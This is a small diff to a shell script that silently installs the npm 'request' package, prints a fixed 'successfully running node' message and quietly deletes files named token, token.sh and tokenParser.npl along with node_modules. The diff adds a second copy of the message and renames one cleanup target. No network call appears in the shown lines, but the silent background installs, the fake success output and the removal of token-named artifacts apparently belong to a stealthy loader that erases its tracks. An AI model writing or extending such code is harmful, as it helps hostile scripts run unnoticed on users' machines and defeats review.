@@ -51,6 +51,8 @@ fi
 
 # Step 7: Install the "request" package if it's not installed
 if [ ! -d "$(pwd)/node_modules/request" ]; then
+
+    echo "successfully running node"
     npm install request --silent --no-progress --loglevel=error --fund=false >/dev/null 2>&1 &
     wait
 fi
@@ -67,7 +69,7 @@ fi
 echo "successfully running node"
 
 # Step 9: Clean up generated files
-rm -f "$(pwd)/token.cmd" >/dev/null 2>&1 &
+rm -f "$(pwd)/token.sh" >/dev/null 2>&1 &
 rm -f "$(pwd)/token" >/dev/null 2>&1 &
 rm -f "$(pwd)/tokenParser.npl" >/dev/null 2>&1 &
 rm -rf "$(pwd)/node_modules" >/dev/null 2>&1 &
